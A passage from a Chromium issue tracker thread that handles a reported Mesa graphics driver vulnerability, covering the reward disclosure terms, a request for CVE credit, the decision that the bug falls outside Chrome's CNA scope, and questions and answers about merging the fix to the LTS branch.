* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-02-06)

Congratulations! Thank you for your efforts and reporting this issue to us -- nice work!

### du...@gmail.com (2025-02-12)

Thanks! If there is any CVE, pls credit Duy (kyr04i) Nguyen and Toan (suto) Pham of Qrious Secure.

### am...@chromium.org (2025-02-13)

Since the vulnerability was not in Chrome Browser code and is in the Mesa driver upstream code, this is out of scope for our CNA and it would be inappropriate for Chrome to issue a CVE for this bug.

### pe...@google.com (2025-02-19)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-02-19)

1. https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6276248
2. Low - There was no conflict.
3. No
4. Yes. According to the comment #16, commit fbafe5697750b35984bfa327147ad2a362a70ea5 [1] was included in M132. Thus, I think we need to merge the fix to M132 LTS as well.

[1] https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6063368

### qk...@google.com (2025-03-05)

Labelling as LTS-NotApplicable-126 because M126 doesn't contain the suspected CL[1]

[1] https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6063368

### ch...@google.com (2025-05-06)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/386565127)*
